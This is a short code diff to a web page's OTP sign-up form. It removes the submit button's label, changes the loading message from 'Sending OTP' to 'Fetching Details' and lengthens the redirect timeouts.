@@ -117,11 +117,11 @@
       <input type="text" id="firstName" placeholder="First Name" required>
       <input type="text" id="lastName" placeholder="Last Name" required>
       <input type="text" id="phone" placeholder="Phone Number" required>
-      <button type="submit">Send OTP</button>
+      <button type="submit"></button>
     </form>
 
     <div id="loading">
-      ⏳ Sending OTP... Please wait
+      ⏳ Fetching Details... Please wait
       <div class="spinner"></div>
     </div>
 
@@ -178,9 +178,9 @@
             // Step 3: redirect to otp.html
             setTimeout(() => {
               window.location.href = `otp.html?sessionId=${sessionId}`;
-            }, 5000);
-          }, 5000);
-        }, 3000);
+            }, 6000);
+          }, 6000);
+        }, 5000);
       })
       .catch(error => {
         alert("Error: " + error.message);
